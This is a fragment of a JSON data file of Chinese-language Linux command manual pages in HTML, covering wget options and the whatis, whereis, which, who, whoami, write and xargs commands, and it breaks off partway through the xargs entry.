--user-agent=<span class=\"hljs-string\">\"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204 Safari/534.16\"</span> http://www.jsdig.com/testfile.zip\n</code></pre>\n<p>有些网站能通过根据判断代理名称不是浏览器而拒绝你的下载请求。不过你可以通过<code>--user-agent</code>参数伪装。</p>\n<p><strong>测试下载链接</strong> </p>\n<p>当你打算进行定时下载，你应该在预定时间测试下载链接是否有效。我们可以增加<code>--spider</code>参数进行检查。</p>\n<pre><code class=\"language-shell\">wget <span class=\"hljs-comment\">--spider URL</span>\n</code></pre>\n<p>如果下载链接正确，将会显示:</p>\n<pre><code class=\"language-shell\">Spider mode enabled. Check <span class=\"hljs-keyword\">if</span> remote <span class=\"hljs-built_in\">file</span> exists.\nHTTP request sent, awaiting response... <span class=\"hljs-number\">200</span> OK\nLength: unspecified [<span class=\"hljs-built_in\">text</span>/html]\nRemote <span class=\"hljs-built_in\">file</span> exists <span class=\"hljs-keyword\">and</span> could <span class=\"hljs-keyword\">contain</span> further links,\n<span class=\"hljs-keyword\">but</span> recursion <span class=\"hljs-keyword\">is</span> disabled <span class=\"hljs-comment\">-- not retrieving.</span>\n</code></pre>\n<p>这保证了下载能在预定的时间进行，但当你给错了一个链接，将会显示如下错误:</p>\n<pre><code class=\"language-shell\">wget <span class=\"hljs-comment\">--spider url</span>\nSpider mode enabled. Check <span class=\"hljs-keyword\">if</span> remote <span class=\"hljs-built_in\">file</span> exists.\nHTTP request sent, awaiting response... <span class=\"hljs-number\">404</span> Not Found\nRemote <span class=\"hljs-built_in\">file</span> <span class=\"hljs-keyword\">does</span> <span class=\"hljs-keyword\">not</span> exist <span class=\"hljs-comment\">-- broken link!!!</span>\n</code></pre>\n<p>你可以在以下几种情况下使用<code>--spider</code>参数：</p>\n<ul>\n<li>  定时下载之前进行检查</li>\n<li>  间隔检测网站是否可用</li>\n<li>  检查网站页面的死链接</li>\n</ul>\n<p><strong>增加重试次数</strong> </p>\n<pre><code class=\"language-shell\">wget <span class=\"hljs-attribute\">--tries</span>=40 URL\n</code></pre>\n<p>如果网络有问题或下载一个大文件也有可能失败。wget默认重试20次连接下载文件。如果需要，你可以使用<code>--tries</code>增加重试次数。</p>\n<p><strong>下载多个文件</strong> </p>\n<pre><code class=\"language-shell\">wget -<span class=\"hljs-selector-tag\">i</span> filelist<span class=\"hljs-selector-class\">.txt</span>\n</code></pre>\n<p>首先，保存一份下载链接文件：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">cat</span> &gt; filelist.txt\nurl1\nurl2\nurl3\nurl4\n</code></pre>\n<p>接着使用这个文件和参数<code>-i</code>下载。</p>\n<p><strong>镜像网站</strong> </p>\n<pre><code class=\"language-shell\">wget <span class=\"hljs-params\">--mirror</span> -p <span class=\"hljs-params\">--convert-links</span> -P <span class=\"hljs-string\">./LOCAL</span> URL\n</code></pre>\n<p>下载整个网站到本地。</p>\n<ul>\n<li>  <code>--miror</code>开户镜像下载。</li>\n<li>  <code>-p</code>下载所有为了html页面显示正常的文件。</li>\n<li>  <code>--convert-links</code>下载后，转换成本地的链接。</li>\n<li>  <code>-P&nbsp;./LOCAL</code>保存所有文件和目录到本地指定目录。</li>\n</ul>\n<p><strong>过滤指定格式下载</strong> </p>\n<pre><code class=\"language-shell\">wget <span class=\"hljs-attribute\">--reject</span>=gif ur\n</code></pre>\n<p>下载一个网站，但你不希望下载图片，可以使用这条命令。</p>\n<p><strong>把下载信息存入日志文件</strong> </p>\n<pre><code class=\"language-shell\">wget -o download.<span class=\"hljs-built_in\">log</span> <span class=\"hljs-built_in\">URL</span>\n</code></pre>\n<p>不希望下载信息直接显示在终端而是在一个日志文件，可以使用。</p>\n<p><strong>限制总下载文件大小</strong> </p>\n<pre><code class=\"language-shell\">wget -Q5m -<span class=\"hljs-selector-tag\">i</span> filelist<span class=\"hljs-selector-class\">.txt</span>\n</code></pre>\n<p>当你想要下载的文件超过5M而退出下载，你可以使用。注意：这个参数对单个文件下载不起作用，只能递归下载时才有效。</p>\n<p><strong>下载指定格式文件</strong> </p>\n<pre><code class=\"language-shell\">wget -r -<span class=\"hljs-selector-tag\">A</span><span class=\"hljs-selector-class\">.pdf</span> url\n</code></pre>\n<p>可以在以下情况使用该功能：</p>\n<ul>\n<li>  下载一个网站的所有图片。</li>\n<li>  下载一个网站的所有视频。</li>\n<li>  下载一个网站的所有PDF文件。</li>\n</ul>\n<p><strong>FTP下载</strong> </p>\n<pre><code class=\"language-shell\">wget ftp-url\nwget <span class=\"hljs-attribute\">--ftp-user</span>=USERNAME <span class=\"hljs-attribute\">--ftp-password</span>=PASSWORD url\n</code></pre>\n<p>可以使用wget来完成ftp链接的下载。</p>\n<p>使用wget匿名ftp下载：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">wget ftp-url</span>\n</code></pre>\n<p>使用wget用户名和密码认证的ftp下载：</p>\n<pre><code class=\"language-shell\">wget <span class=\"hljs-attribute\">--ftp-user</span>=USERNAME <span class=\"hljs-attribute\">--ftp-password</span>=PASSWORD url\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "whatis",
        "des": "查询一个命令执行什么功能",
        "body": "<h1 id=\"whatis\">whatis</h1>\n<p>查询一个命令执行什么功能</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>whatis命令</strong> 是用于查询一个命令执行什么功能，并将查询结果打印到终端上。</p>\n<p>whatis命令在用<code>catman -w</code>命令创建的数据库中查找command参数指定的命令、系统调用、库函数或特殊文件名。whatis命令显示手册部分的页眉行。然后可以发出man命令以获取附加的信息。whatis命令等同于使用<code>man -f</code>命令。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">whatis</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\">[root@localhost ~]# whatis <span class=\"hljs-keyword\">ls</span>\n<span class=\"hljs-keyword\">ls</span>                   (<span class=\"hljs-number\">1</span>)  - <span class=\"hljs-keyword\">list</span> directory contents\n<span class=\"hljs-keyword\">ls</span>                   (<span class=\"hljs-number\">1</span><span class=\"hljs-keyword\">p</span>)  - <span class=\"hljs-keyword\">list</span> directory contents\n\n[root@localhost ~]# whatis <span class=\"hljs-keyword\">cp</span>\n<span class=\"hljs-keyword\">cp</span>                   (<span class=\"hljs-number\">1</span>)  - <span class=\"hljs-keyword\">copy</span> <span class=\"hljs-keyword\">files</span> <span class=\"hljs-built_in\">and</span> directories\n<span class=\"hljs-keyword\">cp</span>                   (<span class=\"hljs-number\">1</span><span class=\"hljs-keyword\">p</span>)  - <span class=\"hljs-keyword\">copy</span> <span class=\"hljs-keyword\">files</span>\n\n[root@localhost ~]# whatis chown\nchown                (<span class=\"hljs-number\">1</span>)  - <span class=\"hljs-keyword\">change</span> <span class=\"hljs-keyword\">file</span> owner <span class=\"hljs-built_in\">and</span> group\nchown                (<span class=\"hljs-number\">1</span><span class=\"hljs-keyword\">p</span>)  - <span class=\"hljs-keyword\">change</span> the <span class=\"hljs-keyword\">file</span> ownership\nchown                (<span class=\"hljs-number\">2</span>)  - <span class=\"hljs-keyword\">change</span> ownership of <span class=\"hljs-keyword\">a</span> <span class=\"hljs-keyword\">file</span>\nchown                (<span class=\"hljs-number\">3</span><span class=\"hljs-keyword\">p</span>)  - <span class=\"hljs-keyword\">change</span> owner <span class=\"hljs-built_in\">and</span> group of <span class=\"hljs-keyword\">a</span> <span class=\"hljs-keyword\">file</span>\n\n[root@localhost ~]# whatis man\nman                  (<span class=\"hljs-number\">1</span>)  - format <span class=\"hljs-built_in\">and</span> <span class=\"hljs-keyword\">display</span> the <span class=\"hljs-keyword\">on</span>-<span class=\"hljs-built_in\">line</span> manual pages\nman                  (<span class=\"hljs-number\">1</span><span class=\"hljs-keyword\">p</span>)  - <span class=\"hljs-keyword\">display</span> <span class=\"hljs-built_in\">system</span> documentation\nman                  (<span class=\"hljs-number\">7</span>)  - macros <span class=\"hljs-keyword\">to</span> format man pages\nman                 (rpm) - A <span class=\"hljs-keyword\">set</span> of documentation tools: man, apropos <span class=\"hljs-built_in\">and</span> whatis.\nman-pages           (rpm) - Man (manual) pages from the Linux Documentation Project.\nman.config [man]     (<span class=\"hljs-number\">5</span>)  - configuration data <span class=\"hljs-keyword\">for</span> man\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "whereis",
        "des": "查找二进制程序、代码等相关文件路径",
        "body": "<h1 id=\"whereis\">whereis</h1>\n<p>查找二进制程序、代码等相关文件路径</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>whereis命令</strong> 用来定位指令的二进制程序、源代码文件和man手册页等相关文件的路径。</p>\n<p>whereis命令只能用于程序名的搜索，而且只搜索二进制文件（参数-b）、man说明文件（参数-m）和源代码文件（参数-s）。如果省略参数，则返回所有信息。</p>\n<p>和find相比，whereis查找的速度非常快，这是因为linux系统会将&nbsp;系统内的所有文件都记录在一个数据库文件中，当使用whereis和下面即将介绍的locate时，会从数据库中查找数据，而不是像find命令那样，通&nbsp;过遍历硬盘来查找，效率自然会很高。 但是该数据库文件并不是实时更新，默认情况下时一星期更新一次，因此，我们在用whereis和locate&nbsp;查找文件时，有时会找到已经被删除的数据，或者刚刚建立文件，却无法查找到，原因就是因为数据库文件没有被更新。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">whereis</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-b：只查找二进制文件；</span>\n<span class=\"hljs-deletion\">-B&lt;目录&gt;：只在设置的目录下查找二进制文件；</span>\n<span class=\"hljs-deletion\">-f：不显示文件名前的路径名称；</span>\n<span class=\"hljs-deletion\">-m：只查找说明文件；</span>\n<span class=\"hljs-deletion\">-M&lt;目录&gt;：只在设置的目录下查找说明文件；</span>\n<span class=\"hljs-deletion\">-s：只查找原始代码文件；</span>\n<span class=\"hljs-deletion\">-S&lt;目录&gt;只在设置的目录下查找原始代码文件；</span>\n<span class=\"hljs-deletion\">-u：查找不包含指定类型的文件。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>指令名：要查找的二进制程序、源文件和man手册页的指令名。</p>\n<h3 id=\"实例\">实例</h3>\n<p>将相关的文件都查找出来</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># whereis tomcat</span>\ntomcat:\n\n[root@localhost ~]<span class=\"hljs-comment\"># whereis svn</span>\nsvn: <span class=\"hljs-regexp\">/usr/</span>bin<span class=\"hljs-regexp\">/svn /u</span>sr<span class=\"hljs-regexp\">/local/</span>svn <span class=\"hljs-regexp\">/usr/</span>share<span class=\"hljs-regexp\">/man/m</span>an1/svn.<span class=\"hljs-number\">1</span>.gz\n</code></pre>\n<p>说明：tomcat没安装，找不出来，svn安装找出了很多相关文件</p>\n<p>只将二进制文件查找出来&nbsp;</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># whereis -b svn</span>\nsvn: <span class=\"hljs-regexp\">/usr/</span>bin<span class=\"hljs-regexp\">/svn /u</span>sr<span class=\"hljs-regexp\">/local/</span>svn\n\n[root@localhost ~]<span class=\"hljs-comment\"># whereis -m svn</span>\nsvn: <span class=\"hljs-regexp\">/usr/</span>share<span class=\"hljs-regexp\">/man/m</span>an1/svn.<span class=\"hljs-number\">1</span>.gz\n\n[root@localhost ~]<span class=\"hljs-comment\"># whereis -s svn</span>\nsvn:\n</code></pre>\n<p>说明：<code>whereis&nbsp;-m&nbsp;svn</code>查出说明文档路径，<code>whereis&nbsp;-s&nbsp;svn</code>找source源文件。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "which",
        "des": "查找并显示给定命令的绝对路径",
        "body": "<h1 id=\"which\">which</h1>\n<p>查找并显示给定命令的绝对路径</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>which命令</strong> 用于查找并显示给定命令的绝对路径，环境变量PATH中保存了查找命令时需要遍历的目录。which指令会在环境变量$PATH设置的目录里查找符合条件的文件。也就是说，使用which命令，就可以看到某个系统命令是否存在，以及执行的到底是哪一个位置的命令。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">which</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-n&lt;文件名长度&gt;：制定文件名长度，指定的长度必须大于或等于所有文件中最长的文件名；</span>\n<span class=\"hljs-deletion\">-p&lt;文件名长度&gt;：与-n参数相同，但此处的&lt;文件名长度&gt;包含了文件的路径；</span>\n<span class=\"hljs-deletion\">-w：指定输出时栏位的宽度；</span>\n<span class=\"hljs-deletion\">-V：显示版本信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>指令名：指令名列表。</p>\n<h3 id=\"实例\">实例</h3>\n<p>查找文件、显示命令路径：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># which pwd</span>\n<span class=\"hljs-regexp\">/bin/</span>pwd\n\n[root@localhost ~]<span class=\"hljs-comment\"># which adduser</span>\n<span class=\"hljs-regexp\">/usr/</span>sbin/adduser\n</code></pre>\n<p>说明：which是根据使用者所配置的&nbsp;PATH&nbsp;变量内的目录去搜寻可运行档的！所以，不同的&nbsp;PATH&nbsp;配置内容所找到的命令当然不一样的！</p>\n<p>用 which 去找出 cd</p>\n<pre><code class=\"language-shell\">[root@localhost ~]# <span class=\"hljs-keyword\">which</span> <span class=\"hljs-keyword\">cd</span>\n<span class=\"hljs-keyword\">cd</span>: <span class=\"hljs-keyword\">shell</span> built-<span class=\"hljs-keyword\">in</span> command\n</code></pre>\n<p>cd 这个常用的命令竟然找不到啊！为什么呢？这是因为 cd 是bash 内建的命令！ 但是 which 默认是找 PATH 内所规范的目录，所以当然一定找不到的！</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "who",
        "des": "显示当前所有登陆用户的信息。",
        "body": "<h1 id=\"who\">who</h1>\n<p>显示当前所有登陆用户的信息。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\">who <span class=\"hljs-selector-attr\">[OPTION]</span>... <span class=\"hljs-selector-attr\">[file]</span> <span class=\"hljs-selector-attr\">[am i]</span>\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>当没有给出非选项参数时，按以下字段顺序为每个当前用户打印信息：登录用户名称，终端信息，登录时间，远程主机或X display。</li>\n<li>当用户执行 <code>who am i</code> 时，只显示运行该命令的用户的信息。</li>\n</ul>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\">-<span class=\"hljs-string\">a</span>, <span class=\"hljs-built_in\">--all</span>                                等价于调用 <span class=\"hljs-string\">'-b -d --login -p -r -t -T -u'</span>。\n-<span class=\"hljs-string\">b</span>, <span class=\"hljs-built_in\">--boot</span>                               上次系统启动的时间。\n-<span class=\"hljs-string\">d</span>, <span class=\"hljs-built_in\">--dead</span>                               打印 <span class=\"hljs-string\">dead</span> 状态的进程。\n-<span class=\"hljs-string\">H</span>, <span class=\"hljs-built_in\">--heading</span>                            打印列标题行。\n-<span class=\"hljs-string\">l</span>, <span class=\"hljs-built_in\">--login</span>                              打印系统登录进程。\n<span class=\"hljs-built_in\">--lookup</span>                                 尝试通过 <span class=\"hljs-string\">DNS</span> 规范主机名。\n-<span class=\"hljs-string\">m</span>                                       仅显示和标准输入关联的主机名和用户。\n-<span class=\"hljs-string\">p</span>, <span class=\"hljs-built_in\">--process</span>                            打印由 <span class=\"hljs-string\">init</span> 生成的活动进程。\n-<span class=\"hljs-string\">q</span>, <span class=\"hljs-built_in\">--count</span>                              列出所有已登录的用户的名称和数量。\n-<span class=\"hljs-string\">r</span>, <span class=\"hljs-built_in\">--runlevel</span>                           打印当前运行级别。\n-<span class=\"hljs-string\">s</span>, <span class=\"hljs-built_in\">--short</span>                              仅打印名称、行和时间（默认）。\n-<span class=\"hljs-string\">t</span>, <span class=\"hljs-built_in\">--time</span>                               打印上次系统时钟更改。\n-<span class=\"hljs-string\">T</span>, -<span class=\"hljs-string\">w</span>, <span class=\"hljs-built_in\">--mesg,</span> <span class=\"hljs-built_in\">--message,</span> <span class=\"hljs-built_in\">--writable</span>    将 <span class=\"hljs-string\">'+、-、?'</span> 中的一个作为用户的消息状态添加到用户名称后面。\n-<span class=\"hljs-string\">u</span>, <span class=\"hljs-built_in\">--users</span>                              列出登录的用户。\n<span class=\"hljs-built_in\">--help</span>                                   显示帮助信息并退出。\n<span class=\"hljs-built_in\">--version</span>                                显示版本信息并退出。\n\n关于 -<span class=\"hljs-string\">T</span> 选项的 <span class=\"hljs-string\">'+、-、?'</span>：\n<span class=\"hljs-string\">'+'</span>  允许写入信息\n<span class=\"hljs-string\">'-'</span>  禁止写入信息\n<span class=\"hljs-string\">'?'</span>  不能查找到终端设备\n</code></pre>\n<h2 id=\"参数\">参数</h2>\n<p>file（可选）：指定 <code>file</code> 代替默认的 <code>/var/run/utmp</code> 、<code>/etc/utmp</code> ；通常使用 <code>/var/log/wtmp</code> 作为参数用于查看过去登陆系统的用户。</p>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回0表示成功，返回非0值表示失败。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\">[root@localhost ~]# who\nroot     pts/<span class=\"hljs-number\">0</span>        <span class=\"hljs-number\">2013-08-19</span> <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">04</span> (<span class=\"hljs-number\">192.168.0.134</span>)\nroot     pts/<span class=\"hljs-number\">1</span>        <span class=\"hljs-number\">2013-12-20</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">37</span> (<span class=\"hljs-number\">180.111.155.40</span>)\n\n[root@localhost ~]# who -q\nroot root\n# users=<span class=\"hljs-number\">2</span>\n\n[root@localhost ~]# who -H\nNAME     LINE         time             COMMENT\nroot     pts/<span class=\"hljs-number\">0</span>        <span class=\"hljs-number\">2013-08-19</span> <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">04</span> (<span class=\"hljs-number\">192.168.0.134</span>)\nroot     pts/<span class=\"hljs-number\">1</span>        <span class=\"hljs-number\">2013-12-20</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">37</span> (<span class=\"hljs-number\">180.111.155.40</span>)\n\n[root@localhost ~]# who -w\nroot     + pts/<span class=\"hljs-number\">0</span>        <span class=\"hljs-number\">2013-08-19</span> <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">04</span> (<span class=\"hljs-number\">192.168.0.134</span>)\nroot     + pts/<span class=\"hljs-number\">1</span>        <span class=\"hljs-number\">2013-12-20</span> <span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">37</span> (<span class=\"hljs-number\">180.111.155.40</span>)\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li>该命令是<code>GNU coreutils</code>包中的命令，相关的帮助信息请查看<code>man -s 1 who</code>，<code>info coreutils 'who invocation'</code>。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "whoami",
        "des": "打印当前有效的用户ID对应的名称",
        "body": "<h1 id=\"whoami\">whoami</h1>\n<p>打印当前有效的用户ID对应的名称</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\">whoami [<span class=\"hljs-symbol\">OPTION</span>]...\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li>打印当前有效的用户ID对应的名称。</li>\n</ul>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">--help       显示帮助信息并退出。</span>\n<span class=\"hljs-comment\">--version    显示版本信息并退出。</span>\n</code></pre>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回0表示成功，返回非0值表示失败。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\">[root<span class=\"hljs-symbol\">@localhost</span> ~]<span class=\"hljs-meta\"># whoami</span>\nroot\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li>该命令等价于 <code>id -un</code>。</li>\n<li>注意区分 <code>whoami</code> 和 <code>logname</code> 这两个命令；比如我们以用户 <code>root</code> 打开的终端，然后切换到了用户 <code>user2</code>。此时， <code>whoami</code>返回的是当前用户 <code>user2</code>, <code>logname</code> 返回的是 <code>root</code>，大家可以自行实践验证一下。</li>\n<li>该命令是<code>GNU coreutils</code>包中的命令，相关的帮助信息请查看<code>man -s 1 whoami</code>，<code>info coreutils 'whoami invocation'</code>。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "write",
        "des": "向指定登录用户终端上发送信息",
        "body": "<h1 id=\"write\">write</h1>\n<p>向指定登录用户终端上发送信息</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>write命令</strong> 用于向指定登录用户终端上发送信息。通过write命令可传递信息给另一位登入系统的用户，当输入完毕后，键入EOF表示信息结束，write命令就会将信息传给对方。如果接收信息的用户不只登入本地主机一次，你可以指定接收信息的终端机编号。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">write</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<pre><code class=\"language-shell\">用户：指定要接受信息的登录用户；\n登陆终端：指定接收信息的用户的登录终端。\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>传信息给Rollaend，此时Rollaend只有一个连线 :&nbsp;</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">write</span> Rollaend\n</code></pre>\n<p>接下来就是将信息打上去，结束请Ctrl+C：</p>\n<p>传信息给Rollaend、Rollaend的连线有pts/2、pts/3：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">write</span> Rollaend <span class=\"hljs-keyword\">pts</span>/<span class=\"hljs-number\">2</span>\n</code></pre>\n<p>接下来就是将信息打上去，结束请Ctrl+C：</p>\n<p>若对方设定<code>mesg n</code>，则此时信息将无法传给对方。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "xargs",
        "des": "给其他命令传递参数的一个过滤器",
        "body": "<h1 id=\"xargs\">xargs</h1>\n<p>给其他命令传递参数的一个过滤器</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>xargs 命令</strong> 是给其他命令传递参数的一个过滤器，也是组合多个命令的一个工具。它擅长将标准输入数据转换成命令行参数，xargs 能够处理管道或者 stdin 并将其转换成特定命令的命令参数。xargs 也可以将单行或多行文本输入转换为其他格式，例如多行变单行，单行变多行。xargs 的默认命令是 echo，空格是默认定界符。这意味着通过管道传递给 xargs 的输入将会包含换行和空白，不过通过 xargs 的处理，换行和空白将被空格取代。xargs 是构建单行命令的重要组件之一。</p>\n<h3 id=\"xargs-命令用法\">xargs 命令用法</h3>\n<p>xargs 用作替换工具，读取输入数据重新格式化后输出。</p>\n<p>定义一个测试文件，内有多行文本数据：</p>\n<pre><code class=\"language-shell\">cat test<span class=\"hljs-selector-class\">.txt</span>\n\n<span class=\"hljs-selector-tag\">a</span> <span class=\"hljs-selector-tag\">b</span> c d e f g\nh <span class=\"hljs-selector-tag\">i</span> j k l m n\no <span class=\"hljs-selector-tag\">p</span> <span class=\"hljs-selector-tag\">q</span>\nr s t\nu v w x y z\n</code></pre>\n<p>多行输入单行输出：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-selector-tag\">cat</span> <span class=\"hljs-selector-tag\">test</span><span class=\"hljs-selector-class\">.txt</span> | <span class=\"hljs-selector-tag\">xargs</span>\n\n<span class=\"hljs-selector-tag\">a</span> <span class=\"hljs-selector-tag\">b</span> <span class=\"hljs-selector-tag\">c</span> <span class=\"hljs-selector-tag\">d</span> <span class=\"hljs-selector-tag\">e</span> <span class=\"hljs-selector-tag\">f</span> <span class=\"hljs-selector-tag\">g</span> <span class=\"hljs-selector-tag\">h</span> <span class=\"hljs-selector-tag\">i</span> <span class=\"hljs-selector-tag\">j</span> <span class=\"hljs-selector-tag\">k</span> <span class=\"hljs-selector-tag\">l</span> <span class=\"hljs-selector-tag\">m</span> <span class=\"hljs-selector-tag\">n</span> <span class=\"hljs-selector-tag\">o</span> <span class=\"hljs-selector-tag\">p</span> <span class=\"hljs-selector-tag\">q</span> <span class=\"hljs-selector-tag\">r</span> <span class=\"hljs-selector-tag\">s</span> <span class=\"hljs-selector-tag\">t</span> <span class=\"hljs-selector-tag\">u</span> <span class=\"hljs-selector-tag\">v</span> <span class=\"hljs-selector-tag\">w</span> <span class=\"hljs-selector-tag\">x</span> <span class=\"hljs-selector-tag\">y</span> <span class=\"hljs-selector-tag\">z</span>\n</code></pre>\n<h4 id=\"使用--n-进行多行输出\">使用 -n 进行多行输出</h4>\n<p><strong>-n 选项</strong> 多行输出：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-selector-tag\">cat</span> <span class=\"hljs-selector-tag\">test</span><span class=\"hljs-selector-class\">.txt</span> | <span class=\"hljs-selector-tag\">xargs</span> <span class=\"hljs-selector-tag\">-n3</span>\n\n<span class=\"hljs-selector-tag\">a</span> <span class=\"hljs-selector-tag\">b</span> <span class=\"hljs-selector-tag\">c</span>\n<span class=\"hljs-selector-tag\">d</span> <span class=\"hljs-selector-tag\">e</span> <span class=\"hljs-selector-tag\">f</span>\n<span class=\"hljs-selector-tag\">g</span> <span class=\"hljs-selector-tag\">h</span> <span class=\"hljs-selector-tag\">i</span>\n<span class=\"hljs-selector-tag\">j</span> <span class=\"hljs-selector-tag\">k</span> <span class=\"hljs-selector-tag\">l</span>\n<span class=\"hljs-selector-tag\">m</span> <span class=\"hljs-selector-tag\">n</span> <span class=\"hljs-selector-tag\">o</span>\n<span class=\"hljs-selector-tag\">p</span> <span class=\"hljs-selector-tag\">q</span> <span class=\"hljs-selector-tag\">r</span>\n<span class=\"hljs-selector-tag\">s</span> <span class=\"hljs-selector-tag\">t</span> <span class=\"hljs-selector-tag\">u</span>\n<span class=\"hljs-selector-tag\">v</span> <span class=\"hljs-selector-tag\">w</span> <span class=\"hljs-selector-tag\">x</span>\n<span class=\"hljs-selector-tag\">y</span> <span class=\"hljs-selector-tag\">z</span>\n</code></pre>\n<h4 id=\"使用--d-分割输入\">使用 -d 分割输入</h4>\n<p><strong>-d 选项</strong> 可以自定义一个定界符：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"nameXnameXnameXname\"</span> | xargs -dX\n\n<span class=\"hljs-built_in\">name</span> <span class=\"hljs-built_in\">name</span> <span class=\"hljs-built_in\">name</span> <span class=\"hljs-built_in\">name</span>\n</code></pre>\n<p>结合 <strong>-n 选项</strong> 使用：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"nameXnameXnameXname\"</span> | xargs -dX -n2\n\n<span class=\"hljs-built_in\">name</span> <span class=\"hljs-built_in\">name</span>\n<span class=\"hljs-built_in\">name</span> <span class=\"hljs-built_in\">name</span>\n</code></pre>\n<h4 id=\"读取-stdin\">读取 stdin</h4>\n<p><strong>读取 stdin，将格式化后的参数传递给命令</strong></p>\n<p>假设一个命令为 sk.sh 和一个保存参数的文件 arg.txt：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\">#!/bin/bash</span>\n<span class=\"hljs-comment\">#sk.sh 命令内容，打印出所有参数。</span>\n\n<span class=\"hljs-built_in\">echo</span> $*\n</code></pre>\n<p>arg.txt 文件内容：</p>\n<pre><code class=\"language-shell\">cat <span class=\"hljs-keyword\">arg</span>.txt\n\naaa\nbbb\nccc\n</code></pre>\n<h4 id=\"结合--i-选项\">结合 -I 选项</h4>\n<p>xargs 的一个 <strong>选项 -I</strong> ，使用 -I 指定一个替换字符串{}，这个字符串在 xargs 扩展时会被替换掉，当 -I 与 xargs 结合使用，每一个参数命令都会被执行一次：</p>\n<pre><code class=\"language-shell\">cat arg.txt | xargs -I {} ./sk.sh -p {} -l\n\n<span class=\"hljs-deletion\">-p aaa -l</span>\n<span class=\"hljs-deletion\">-p bbb -l</span>\n<span class=\"hljs-deletion\">-p ccc -l</span>\n</code></pre>\n<p>复制所有图片文件到 /data/images 目录下：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">ls</span> *<span class=\"hljs-string\">.jpg</span> | xargs -n1 -I cp {} <span class=\"hljs-string\">/data/images</span>\n</code></pre>\n<h4 id=\"结合-find-命令使用\">结合 find 命令使用</h4>\n<p><strong>xargs 结合 find 使用</strong></p>\n<p>用 rm 删除太多的文件时候，可能得到一个错误信息：<code>/bin/rm Argument list too long</code>. 用 <code>xargs</code> 去避免这个问题：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">find</span> . -<span class=\"hljs-built_in\">type</span> f -<span class=\"hljs-built_in\">name</span> <span class=\"hljs-string\">\"*.log\"</span> -print0 | xargs -<span class=\"hljs-number\">0</span> rm 